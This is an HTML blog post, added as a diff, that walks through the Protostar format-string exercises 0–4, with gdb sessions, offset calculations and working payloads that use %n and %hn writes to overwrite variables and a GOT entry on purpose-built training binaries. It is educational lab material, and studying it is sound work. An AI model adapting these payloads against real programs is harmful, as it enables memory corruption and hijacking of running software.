@@ -1,0 +1,408 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Protostar Format String Exploits (Solutions 0-4) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Protostar Format String Exploits (Solutions 0-4) Overview Protostar is a series of exercises from Exploit Exercises. In addition to three final &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Protostar Format String Exploits (Solutions 0-4)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (&ldquo;Format&rdquo;).</p>
+
+<h1>Solutions</h1>
+
+<h2>Format: Level 0</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
+
+<div>
+  <pre><code class='console'>$ ./format0 %64s$(perl -e 'print &quot;\xef\xbe\xad\xde&quot;')
+
+you have hit the target correctly :)</code></pre>
+</div>
+
+
+
+
+<!-- more -->
+
+
+<h2>Format: Level 1</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>
+
+<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).</p>
+
+<div>
+  <pre><code class='console'>$ objdump -t format1 | grep target
+08049638 g       0 .bss    00000004            target</code></pre>
+</div>
+
+
+<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>
+
+<div>
+  <pre><code class='text'>Starting program: /opt/protostar/bin/format1 AAAA%08x
+
+Breakpoint 1, __printf (format=0xbffff98f &quot;AAAA%08x&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/10xw $esp
+0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
+0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
+0xbffff788:     0xbffff7b8      0x08048469
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c
+(gdb) p 0xbffff98f - 0x0bffff784
+$1 = 523</code></pre>
+</div>
+
+
+<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string&rsquo;s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>
+
+<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.</p>
+
+<div>
+  <pre><code class='text'>(gdb) run AAAAA%08x
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /opt/protostar/bin/format1 AAAAA%08x
+
+Breakpoint 1, __printf (format=0xbffff98e &quot;AAAAA%08x&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c</code></pre>
+</div>
+
+
+<ul>
+<li><code>0xbffff784</code>: The first argument to the format string.</li>
+<li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
+</ul>
+
+
+<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for &ldquo;stack popping&rdquo; additional arguments) is about 500 bytes.</p>
+
+<p>With a few calculations, we can find the correct offset.</p>
+
+<div>
+  <pre><code class='console'>$ ./format1 $(perl -e 'print &quot;\x38\x96\x04\x08&quot;')'..%128$n'
+8..you have modified the target :)</code></pre>
+</div>
+
+
+<h2>Format: Level 2</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>
+
+<div>
+  <pre><code class='console'>$ objdump -t format2 | grep target
+080496e4 g     O .bss   00000004              target</code></pre>
+</div>
+
+
+<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
+
+<div>
+  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%4\$08x | ./format2
+080496e4target is 0 :(</code></pre>
+</div>
+
+
+<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
+
+<div>
+  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%60u%4\$n | ./format2
+                                                         512you have modified the target :)</code></pre>
+</div>
+
+
+<h2>Format: Level 3</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>
+
+<div>
+  <pre><code class='console'>$ objdump -t format3 | grep target
+080496f4 g     O .bss   00000004              target</code></pre>
+</div>
+
+
+<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>
+
+<div>
+  <pre><code class='text'>(gdb) break printf
+Breakpoint 1 at 0x804837c
+(gdb) run
+Starting program: /opt/protostar/bin/format3
+AAAA
+Breakpoint 1, __printf (format=0xbffff5a0 &quot;AAAA\n&quot;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff570:
+eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
+called by frame at 0xbffff590
+source language c.
+Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
+Locals at 0xbffff568, Previous frame's sp is 0xbffff570
+Saved registers:
+ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
+(gdb) x/3xw 0xbffff568
+0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
+(gdb) x/w 0xbffff570
+0xbffff570:     0xbffff5a0
+(gdb) p 0xbffff5a0 - 0xbffff570
+= 48</code></pre>
+</div>
+
+
+<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>
+
+<div>
+  <pre><code class='console'>$ echo AAAA%12\$x | ./format3
+AAAA41414141
+target is 00000000 :(</code></pre>
+</div>
+
+
+<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:</p>
+
+<div>
+  <pre><code class='console'>$ echo &quot;ibase=16; 44&quot; | bc
+68
+$ echo &quot;ibase=16; 55&quot; | bc
+85
+$ echo &quot;ibase=16; 02&quot; | bc
+2
+$ echo &quot;ibase=16; 01&quot; | bc
+1</code></pre>
+</div>
+
+
+<p>Finally, we write values to each of the four bytes of <code>target</code>:</p>
+
+<div>
+  <pre><code class='console'>$ echo $(perl -e 'print &quot;\xf4\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf5\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf6\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf7\x96\x04\x08&quot;')'%52u%12$n%''17u%13$n''%173u%14$n' | ./format3
+���                                                   0       3221222848                                                                                                                                                                   3086839796
+you have modified the target :))</code></pre>
+</div>
+
+
+<p>Note that it wasn&rsquo;t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>
+
+<h2>Format: Level 4</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>
+
+<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>
+
+<div>
+  <pre><code class='console'>$ echo 'AAAA%4$x' | ./format4
+AAAA41414141</code></pre>
+</div>
+
+
+<p>In order to perform this exploit, we&rsquo;ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we&rsquo;ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).</p>
+
+<div>
+  <pre><code class='console'>$ objdump -TR format4 | grep exit
+00000000      DF *UND* 00000000  GLIBC_2.0   _exit
+00000000      DF *UND*  00000000  GLIBC_2.0   exit
+08049718 R_386_JUMP_SLOT   _exit
+08049724 R_386_JUMP_SLOT   exit
+$ objdump -t format4 | grep hello
+080484b4 g     F .text  0000001e              hello</code></pre>
+</div>
+
+
+<p>To confirm that our overwrite works correctly, we run a quick test:</p>
+
+<div>
+  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%4$n' &gt; /tmp/format4
+$ gdb -q format4
+Reading symbols from /opt/protostar/bin/format4...done.
+(gdb) run &lt; /tmp/format4
+Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4
+$�
+Program received signal SIGSEGV, Segmentation fault.
+0x00000004 in ?? ()</code></pre>
+</div>
+
+
+<p>Execution jumped to the address <code>0x00000004</code>, meaning that we&rsquo;re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> &mdash; only the last two bytes need to be changed.</p>
+
+<div>
+  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%33968u%4$hn' | ./format4
+$
+&lt;lots of whitespace&gt;
+512
+                                                                                                                                                                              code execution redirected! you win</code></pre>
+</div>
+
+
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/29/protostar-format0/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/29/protostar-format0/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
